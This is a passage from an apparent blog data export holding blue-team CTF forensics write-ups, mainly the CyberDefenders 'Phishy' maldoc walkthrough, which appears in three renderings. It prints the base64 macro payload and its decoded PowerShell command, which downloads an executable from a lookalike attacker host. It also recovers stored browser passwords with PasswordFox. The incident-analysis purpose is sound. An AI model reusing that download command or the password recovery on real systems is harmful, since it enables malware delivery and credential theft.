IP.</p>\n</blockquote>\n<p>requestFile function use address array as parameters. let’s check it ! we found all the IP address. COOL !</p>\n<p><img data-src=\"https://imgur.com/4NLcX9k.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 174.129.57.253</p>\n</div>\n<blockquote>\n<p>16- How many files the malware requested from external servers?</p>\n</blockquote>\n<p>This is easy man ! just check the other downloaded files !</p>\n<p><img data-src=\"https://imgur.com/hjMszwa.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 9</p>\n</div>\n<blockquote>\n<p>17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order</p>\n</blockquote>\n<p>After spending time on thinking and searching. We get the idea !<br>\nThe malware will get message form attacker servers! So let’s check some functions call that related to something like messaging ! You’ll find these functions in main !</p>\n<p><img data-src=\"https://imgur.com/V4JQttO.png\" alt=\"\"></p>\n<p>The function check if the parameter has these 2 values ! I want to check it</p>\n<p><img data-src=\"https://imgur.com/KSxTPRa.png\" alt=\"\"></p>\n<p>After using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it !</p>\n<p><img data-src=\"https://imgur.com/Hz6LsfB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: nop,run</p>\n</div>\n"},{"title":"CyberDefenders Writeup  Phishy","date":"2022-09-05T15:46:09.000Z","cover":"https://cyberdefenders.org/media/terraform/Phishy/phishy.png","_content":"\nThis CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.\nThe maldoc download a malware in our victim personal computer! Let's figure out what is going on!\n\n# Challenge Information \n\n\n+++info Description\n\nA company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/60\n  desc: CyberDefenders - Phishy \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - SemahBA\n  desc: SemahBA Twitter Profile\n  url: https://twitter.com/BenaliSemah\n  image: https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\n  color: \"#de2336\"\n\n{% endlinks %}\n# Walkthrough \nI use WSL, FTK imager and Registry Explorer\n\n> 1- What is the hostname of the victim machine?\n\n![](https://i.imgur.com/UlU40CE.png)\nLet's check `SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName` registry key \n![](https://i.imgur.com/bUMRhhs.png)\n\nAnswer:  WIN-NF3JQEU4G0T\n\n> 2- What is the messaging app installed on the victim machine?\n\n![WhatsApp](https://i.imgur.com/vE2xpqz.png )\nAnswser: WhatsApp\n\n> 3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.\n\nWhatsApp has a database that stores the messages and discussion. Let's check `\\Users\\Semah\\AppData\\Roaming\\WhatsApp`.We find a folder called `Databases` that contains a `db` that can be opened using `DB Browser for SQLite`. The messages are stored in `msgstore.db`\n![](https://imgur.com/SFlAYTD.png)\nWe can open this db file using `DB Browser` and check the `legacy_available_messages_view` table and we will a discussion about IPhone 12 special edition giveaway \n![](https://imgur.com/EGZVAxH.png)\nAnswer:  http://appIe.com/IPhone-Winners.doc\n\n> 4- Multiple streams contain macros in the document. Provide the number of the highest stream.\n\nThe victim download the word document file. You can find it on `Semah\\Downloads` folder\nLet's export it from FTK imager and use `oledump` to check the streams in the document\nWe find `Macros/VBA/iphoneevil` the highest stream \n```bash command line prompt\nRaf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       \n  1:       114 '\\x01CompObj'\n  2:      4096 '\\x05DocumentSummaryInformation'\n  3:      4096 '\\x05SummaryInformation'\n  4:      8473 '1Table'\n  5:       501 'Macros/PROJECT'\n  6:        68 'Macros/PROJECTwm'\n  7:      3109 'Macros/VBA/_VBA_PROJECT'\n  8:       800 'Macros/VBA/dir'\n  9: M    1170 'Macros/VBA/eviliphone'\n 10: M    5581 'Macros/VBA/iphoneevil'\n```\nAnswer: 10 \n\nLet's do some analysis on the macro and the malicious document using the `oletools` \n\n```bash command line prompt\nRaf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf\nolevba IPhone-Winners.doc --deobf                                                                                 ─╯\nXLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)\nolevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools\n===============================================================================\nFILE: IPhone-Winners.doc\nType: OLE\n-------------------------------------------------------------------------------\nVBA MACRO eviliphone.cls\nin file: IPhone-Winners.doc - OLE stream: 'Macros/VBA/eviliphone'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n```\nScrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded \nٍ![](https://imgur.com/bvrf9oR.png)\nOK let's decode it and check what the attacker want to do ! \n```bash command line prompt\nraf²@4n6nk8s:~$ echo -n \"aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA\" | base64 -d\n\ninvoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\\Temp\\IPhone.exe' -UseDefaultCredentials\n```\nWow! The macro try to run an obfuscated `powershell` command that download an executable from `http://appIe.com/Iphone.exe` and save it as  `C:\\Temp\\IPhone.exe`\n\n\n> 5- The macro executed a program. Provide the program name?\n\nAnswer: Powershell\n\n> 6- The macro downloaded a malicious file. Provide the full download URL.\n\nAnswer: http://appIe.com/Iphone.exe\n\n> 7- Where was the malicious file downloaded to? (Provide the full path)\n\nAnswer:  C:\\Temp\\IPhone.exe\n\n> 8- What is the name of the framework used to create the malware?\n\nI am sure that Metasploit is the framework. But let's make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love `virustotal` \n![](https://imgur.com/BKPJ37M.png)\n\nJust google `Meterpreter` and you'll find that Meterpreter is a Metasploit attack payload that provides an interactive shell\n\nOk dude don't search ! go to `COMMUNITY` tab in `virustotal` and you'll find comments. You'll find a metasploit payload detected ! \n\n![](https://imgur.com/xuOEWiC.png)\n\nAnswer: Metasploit\n\n> 9- What is the attacker's IP address?\n\nOK! Now we know that the malicious document download a binary! Of course this binary is a malware.\nWe need to know what is the attacker's IP address. So let's do some dynamic analysis. We can do it using either `any.run` or `hybrid-analysis`. I will use it both of them just for fun !! Just upload the binary `IPhone.exe` and check the connections !\n\nٍ![](https://imgur.com/w04BlMl.png \"Using app.run.any\")\nٍ![](https://imgur.com/wNJKnce.png \"Using HYBRID ANALYSIS\")\n\nAnswer: 155.94.69.27\n\n> 10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?\n\nWe find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in `AppData\\Roaming\\Mozilla\\Firefox\\`. We can inspect it using SQLite Browser.\nThe most important db file is `places.sqlite`. Inspect it and open the `moz_places` database table and check the history of the victim !\n![](https://imgur.com/qbtAcRf.png)\n\nAnswer:  http://appIe.competitions.com/login.php\n\n> 11- What is the password the user submitted to the login page?\n\nThere is a tool called `Password Fox` that will resolve our problem here !\nPasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.\nDownload it from [here](https://www.nirsoft.net/utils/passwordfox.html)\n\n![](https://imgur.com/pM1lfwD.png \"Here is the password\")\n\nAnswer: GacsriicUZMY4xiAF4yl\n\n","source":"_posts/CyberDefenders/Phishy.md","raw":"---\ntitle: CyberDefenders Writeup  Phishy\ndate: 2022-09-05 16:46:09\ntags:\ncover: https://cyberdefenders.org/media/terraform/Phishy/phishy.png\ncategories:\n- [CyberDefenders]\n---\n\nThis CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.\nThe maldoc download a malware in our victim personal computer! Let's figure out what is going on!\n\n# Challenge Information \n\n\n+++info Description\n\nA company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/60\n  desc: CyberDefenders - Phishy \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - SemahBA\n  desc: SemahBA Twitter Profile\n  url: https://twitter.com/BenaliSemah\n  image: https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\n  color: \"#de2336\"\n\n{% endlinks %}\n# Walkthrough \nI use WSL, FTK imager and Registry Explorer\n\n> 1- What is the hostname of the victim machine?\n\n![](https://i.imgur.com/UlU40CE.png)\nLet's check `SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName` registry key \n![](https://i.imgur.com/bUMRhhs.png)\n\nAnswer:  WIN-NF3JQEU4G0T\n\n> 2- What is the messaging app installed on the victim machine?\n\n![WhatsApp](https://i.imgur.com/vE2xpqz.png )\nAnswser: WhatsApp\n\n> 3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.\n\nWhatsApp has a database that stores the messages and discussion. Let's check `\\Users\\Semah\\AppData\\Roaming\\WhatsApp`.We find a folder called `Databases` that contains a `db` that can be opened using `DB Browser for SQLite`. The messages are stored in `msgstore.db`\n![](https://imgur.com/SFlAYTD.png)\nWe can open this db file using `DB Browser` and check the `legacy_available_messages_view` table and we will a discussion about IPhone 12 special edition giveaway \n![](https://imgur.com/EGZVAxH.png)\nAnswer:  http://appIe.com/IPhone-Winners.doc\n\n> 4- Multiple streams contain macros in the document. Provide the number of the highest stream.\n\nThe victim download the word document file. You can find it on `Semah\\Downloads` folder\nLet's export it from FTK imager and use `oledump` to check the streams in the document\nWe find `Macros/VBA/iphoneevil` the highest stream \n```bash command line prompt\nRaf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       \n  1:       114 '\\x01CompObj'\n  2:      4096 '\\x05DocumentSummaryInformation'\n  3:      4096 '\\x05SummaryInformation'\n  4:      8473 '1Table'\n  5:       501 'Macros/PROJECT'\n  6:        68 'Macros/PROJECTwm'\n  7:      3109 'Macros/VBA/_VBA_PROJECT'\n  8:       800 'Macros/VBA/dir'\n  9: M    1170 'Macros/VBA/eviliphone'\n 10: M    5581 'Macros/VBA/iphoneevil'\n```\nAnswer: 10 \n\nLet's do some analysis on the macro and the malicious document using the `oletools` \n\n```bash command line prompt\nRaf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf\nolevba IPhone-Winners.doc --deobf                                                                                 ─╯\nXLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)\nolevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools\n===============================================================================\nFILE: IPhone-Winners.doc\nType: OLE\n-------------------------------------------------------------------------------\nVBA MACRO eviliphone.cls\nin file: IPhone-Winners.doc - OLE stream: 'Macros/VBA/eviliphone'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n```\nScrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded \nٍ![](https://imgur.com/bvrf9oR.png)\nOK let's decode it and check what the attacker want to do ! \n```bash command line prompt\nraf²@4n6nk8s:~$ echo -n \"aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA\" | base64 -d\n\ninvoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\\Temp\\IPhone.exe' -UseDefaultCredentials\n```\nWow! The macro try to run an obfuscated `powershell` command that download an executable from `http://appIe.com/Iphone.exe` and save it as  `C:\\Temp\\IPhone.exe`\n\n\n> 5- The macro executed a program. Provide the program name?\n\nAnswer: Powershell\n\n> 6- The macro downloaded a malicious file. Provide the full download URL.\n\nAnswer: http://appIe.com/Iphone.exe\n\n> 7- Where was the malicious file downloaded to? (Provide the full path)\n\nAnswer:  C:\\Temp\\IPhone.exe\n\n> 8- What is the name of the framework used to create the malware?\n\nI am sure that Metasploit is the framework. But let's make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love `virustotal` \n![](https://imgur.com/BKPJ37M.png)\n\nJust google `Meterpreter` and you'll find that Meterpreter is a Metasploit attack payload that provides an interactive shell\n\nOk dude don't search ! go to `COMMUNITY` tab in `virustotal` and you'll find comments. You'll find a metasploit payload detected ! \n\n![](https://imgur.com/xuOEWiC.png)\n\nAnswer: Metasploit\n\n> 9- What is the attacker's IP address?\n\nOK! Now we know that the malicious document download a binary! Of course this binary is a malware.\nWe need to know what is the attacker's IP address. So let's do some dynamic analysis. We can do it using either `any.run` or `hybrid-analysis`. I will use it both of them just for fun !! Just upload the binary `IPhone.exe` and check the connections !\n\nٍ![](https://imgur.com/w04BlMl.png \"Using app.run.any\")\nٍ![](https://imgur.com/wNJKnce.png \"Using HYBRID ANALYSIS\")\n\nAnswer: 155.94.69.27\n\n> 10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?\n\nWe find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in `AppData\\Roaming\\Mozilla\\Firefox\\`. We can inspect it using SQLite Browser.\nThe most important db file is `places.sqlite`. Inspect it and open the `moz_places` database table and check the history of the victim !\n![](https://imgur.com/qbtAcRf.png)\n\nAnswer:  http://appIe.competitions.com/login.php\n\n> 11- What is the password the user submitted to the login page?\n\nThere is a tool called `Password Fox` that will resolve our problem here !\nPasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.\nDownload it from [here](https://www.nirsoft.net/utils/passwordfox.html)\n\n![](https://imgur.com/pM1lfwD.png \"Here is the password\")\n\nAnswer: GacsriicUZMY4xiAF4yl\n\n","slug":"CyberDefenders/Phishy","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxn90006d5qfdw7dddc7","content":"<p>This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.<br>\nThe maldoc download a malware in our victim personal computer! Let’s figure out what is going on!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Phishy</p>\n          </div></div><div class=\"item\" title=\"Author - SemahBA\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\" data-background-image=\"https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\">Author - SemahBA</span>\n          <p class=\"desc\">SemahBA Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>I use WSL, FTK imager and Registry Explorer</p>\n<blockquote>\n<p>1- What is the hostname of the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/UlU40CE.png\" alt=\"\"><br>\nLet’s check  <code>SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName</code>  registry key<br>\n<img data-src=\"https://i.imgur.com/bUMRhhs.png\" alt=\"\"></p>\n<p>Answer:  WIN-NF3JQEU4G0T</p>\n<blockquote>\n<p>2- What is the messaging app installed on the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/vE2xpqz.png\" alt=\"WhatsApp\"><br>\nAnswser: WhatsApp</p>\n<blockquote>\n<p>3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.</p>\n</blockquote>\n<p>WhatsApp has a database that stores the messages and discussion. Let’s check  <code>\\Users\\Semah\\AppData\\Roaming\\WhatsApp</code> .We find a folder called  <code>Databases</code>  that contains a  <code>db</code>  that can be opened using  <code>DB Browser for SQLite</code> . The messages are stored in  <code>msgstore.db</code> <br>\n<img data-src=\"https://imgur.com/SFlAYTD.png\" alt=\"\"><br>\nWe can open this db file using  <code>DB Browser</code>  and check the  <code>legacy_available_messages_view</code>  table and we will a discussion about IPhone 12 special edition giveaway<br>\n<img data-src=\"https://imgur.com/EGZVAxH.png\" alt=\"\"><br>\nAnswer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JUGhvbmUtV2lubmVycy5kb2M=\">http://appIe.com/IPhone-Winners.doc</span></p>\n<blockquote>\n<p>4- Multiple streams contain macros in the document. Provide the number of the highest stream.</p>\n</blockquote>\n<p>The victim download the word document file. You can find it on  <code>Semah\\Downloads</code>  folder<br>\nLet’s export it from FTK imager and use  <code>oledump</code>  to check the streams in the document<br>\nWe find  <code>Macros/VBA/iphoneevil</code>  the highest stream</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       </span><br><span class=\"line\">  1:       114 <span class=\"string\">&#x27;\\x01CompObj&#x27;</span></span><br><span class=\"line\">  2:      4096 <span class=\"string\">&#x27;\\x05DocumentSummaryInformation&#x27;</span></span><br><span class=\"line\">  3:      4096 <span class=\"string\">&#x27;\\x05SummaryInformation&#x27;</span></span><br><span class=\"line\">  4:      8473 <span class=\"string\">&#x27;1Table&#x27;</span></span><br><span class=\"line\">  5:       501 <span class=\"string\">&#x27;Macros/PROJECT&#x27;</span></span><br><span class=\"line\">  6:        68 <span class=\"string\">&#x27;Macros/PROJECTwm&#x27;</span></span><br><span class=\"line\">  7:      3109 <span class=\"string\">&#x27;Macros/VBA/_VBA_PROJECT&#x27;</span></span><br><span class=\"line\">  8:       800 <span class=\"string\">&#x27;Macros/VBA/dir&#x27;</span></span><br><span class=\"line\">  9: M    1170 <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\"> 10: M    5581 <span class=\"string\">&#x27;Macros/VBA/iphoneevil&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Answer: 10</p>\n<p>Let’s do some analysis on the macro and the malicious document using the  <code>oletools</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf</span><br><span class=\"line\">olevba IPhone-Winners.doc --deobf                                                                                 ─╯</span><br><span class=\"line\">XLMMacroDeobfuscator: pywin32 is not installed (only is required <span class=\"keyword\">if</span> you want to use MS Excel)</span><br><span class=\"line\">olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools</span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">FILE: IPhone-Winners.doc</span><br><span class=\"line\">Type: OLE</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">VBA MACRO eviliphone.cls</span><br><span class=\"line\"><span class=\"keyword\">in</span> file: IPhone-Winners.doc - OLE stream: <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>\n<p>Scrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded<br>\nٍ<img data-src=\"https://imgur.com/bvrf9oR.png\" alt=\"\"><br>\nOK let’s decode it and check what the attacker want to do !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA&quot;</span> | <span class=\"built_in\">base64</span> -d</span><br><span class=\"line\"></span><br><span class=\"line\">invoke-webrequest -Uri <span class=\"string\">&#x27;http://appIe.com/Iphone.exe&#x27;</span> -OutFile <span class=\"string\">&#x27;C:\\Temp\\IPhone.exe&#x27;</span> -UseDefaultCredentials</span><br></pre></td></tr></table></figure>\n<p>Wow! The macro try to run an obfuscated  <code>powershell</code>  command that download an executable from  <code>http://appIe.com/Iphone.exe</code>  and save it as   <code>C:\\Temp\\IPhone.exe</code></p>\n<blockquote>\n<p>5- The macro executed a program. Provide the program name?</p>\n</blockquote>\n<p>Answer: Powershell</p>\n<blockquote>\n<p>6- The macro downloaded a malicious file. Provide the full download URL.</p>\n</blockquote>\n<p>Answer: <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JcGhvbmUuZXhl\">http://appIe.com/Iphone.exe</span></p>\n<blockquote>\n<p>7- Where was the malicious file downloaded to? (Provide the full path)</p>\n</blockquote>\n<p>Answer:  C:\\Temp\\IPhone.exe</p>\n<blockquote>\n<p>8- What is the name of the framework used to create the malware?</p>\n</blockquote>\n<p>I am sure that Metasploit is the framework. But let’s make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love  <code>virustotal</code> <br>\n<img data-src=\"https://imgur.com/BKPJ37M.png\" alt=\"\"></p>\n<p>Just google  <code>Meterpreter</code>  and you’ll find that Meterpreter is a Metasploit attack payload that provides an interactive shell</p>\n<p>Ok dude don’t search ! go to  <code>COMMUNITY</code>  tab in  <code>virustotal</code>  and you’ll find comments. You’ll find a metasploit payload detected !</p>\n<p><img data-src=\"https://imgur.com/xuOEWiC.png\" alt=\"\"></p>\n<p>Answer: Metasploit</p>\n<blockquote>\n<p>9- What is the attacker’s IP address?</p>\n</blockquote>\n<p>OK! Now we know that the malicious document download a binary! Of course this binary is a malware.<br>\nWe need to know what is the attacker’s IP address. So let’s do some dynamic analysis. We can do it using either  <code>any.run</code>  or  <code>hybrid-analysis</code> . I will use it both of them just for fun !! Just upload the binary  <code>IPhone.exe</code>  and check the connections !</p>\n<p>ٍ<img data-src=\"https://imgur.com/w04BlMl.png\" alt=\"\" title=\"Using app.run.any\"><br>\nٍ<img data-src=\"https://imgur.com/wNJKnce.png\" alt=\"\" title=\"Using HYBRID ANALYSIS\"></p>\n<p>Answer: 155.94.69.27</p>\n<blockquote>\n<p>10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?</p>\n</blockquote>\n<p>We find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in  <code>AppData\\Roaming\\Mozilla\\Firefox\\</code> . We can inspect it using SQLite Browser.<br>\nThe most important db file is  <code>places.sqlite</code> . Inspect it and open the  <code>moz_places</code>  database table and check the history of the victim !<br>\n<img data-src=\"https://imgur.com/qbtAcRf.png\" alt=\"\"></p>\n<p>Answer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbXBldGl0aW9ucy5jb20vbG9naW4ucGhw\">http://appIe.competitions.com/login.php</span></p>\n<blockquote>\n<p>11- What is the password the user submitted to the login page?</p>\n</blockquote>\n<p>There is a tool called  <code>Password Fox</code>  that will resolve our problem here !<br>\nPasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.<br>\nDownload it from <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvcGFzc3dvcmRmb3guaHRtbA==\">here</span></p>\n<p><img data-src=\"https://imgur.com/pM1lfwD.png\" alt=\"\" title=\"Here is the password\"></p>\n<p>Answer: GacsriicUZMY4xiAF4yl</p>\n","site":{"data":{}},"length":4958,"excerpt":"","more":"<p>This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.<br>\nThe maldoc download a malware in our victim personal computer! Let’s figure out what is going on!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Phishy</p>\n          </div></div><div class=\"item\" title=\"Author - SemahBA\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\" data-background-image=\"https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\">Author - SemahBA</span>\n          <p class=\"desc\">SemahBA Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>I use WSL, FTK imager and Registry Explorer</p>\n<blockquote>\n<p>1- What is the hostname of the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/UlU40CE.png\" alt=\"\"><br>\nLet’s check  <code>SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName</code>  registry key<br>\n<img data-src=\"https://i.imgur.com/bUMRhhs.png\" alt=\"\"></p>\n<p>Answer:  WIN-NF3JQEU4G0T</p>\n<blockquote>\n<p>2- What is the messaging app installed on the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/vE2xpqz.png\" alt=\"WhatsApp\"><br>\nAnswser: WhatsApp</p>\n<blockquote>\n<p>3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.</p>\n</blockquote>\n<p>WhatsApp has a database that stores the messages and discussion. Let’s check  <code>\\Users\\Semah\\AppData\\Roaming\\WhatsApp</code> .We find a folder called  <code>Databases</code>  that contains a  <code>db</code>  that can be opened using  <code>DB Browser for SQLite</code> . The messages are stored in  <code>msgstore.db</code> <br>\n<img data-src=\"https://imgur.com/SFlAYTD.png\" alt=\"\"><br>\nWe can open this db file using  <code>DB Browser</code>  and check the  <code>legacy_available_messages_view</code>  table and we will a discussion about IPhone 12 special edition giveaway<br>\n<img data-src=\"https://imgur.com/EGZVAxH.png\" alt=\"\"><br>\nAnswer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JUGhvbmUtV2lubmVycy5kb2M=\">http://appIe.com/IPhone-Winners.doc</span></p>\n<blockquote>\n<p>4- Multiple streams contain macros in the document. 